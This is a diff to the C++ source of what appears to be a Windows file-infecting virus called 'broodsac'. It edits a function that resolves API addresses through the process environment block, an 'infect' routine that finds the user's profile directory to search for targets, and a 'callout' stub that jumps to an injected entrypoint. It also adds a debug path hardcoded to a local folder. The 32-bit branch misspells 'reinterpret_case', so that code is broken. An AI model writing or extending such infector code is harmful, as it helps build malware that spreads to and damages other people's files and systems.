@@ -304,9 +304,9 @@ void load_infector_iat(InfectorIAT *iat)
    if (iat == nullptr)
       return;
 
-#if defined(BROODSAC32)
+#if defined(_M_IX86)
    PPEB peb = reinterpret_case<PPEB>(__readfsdword(0x30));
-#elif defined(BROODSAC64)
+#elif defined(_M_AMD64)
    PPEB peb = reinterpret_cast<PPEB>(__readgsqword(0x60));
 #endif
 
@@ -336,11 +336,15 @@ int infect(void)
 {
    InfectorIAT iat;
    load_infector_iat(&iat);
-   
+
+#ifdef BROODSACDEBUG
+   char profile_directory[MAX_PATH+1] = "C:\\Users\\teal\\Documents\\broodsac";
+#else
    char profile_directory[MAX_PATH+1];
 
    if (iat.getFolderPath(nullptr, CSIDL_PROFILE, nullptr, 0, profile_directory) != 0)
       return 2;
+#endif
 
    char prepend_path[] = "\\\\?\\";
    std::size_t root_size = iat.strlen(prepend_path)+iat.strlen(profile_directory)+1;
@@ -488,9 +492,9 @@ int callout(void)
    /* TODO pushad at the top of the function */
    
    void (* volatile entrypoint)() = callback;
-#if defined(BROODSAC32)
+#if defined(_M_IX86)
    PPEB peb = reinterpret_case<PPEB>(__readfsdword(0x30));
-#elif defined(BROODSAC64)
+#elif defined(_M_AMD64)
    PPEB peb = reinterpret_cast<PPEB>(__readgsqword(0x60));
 #endif
 
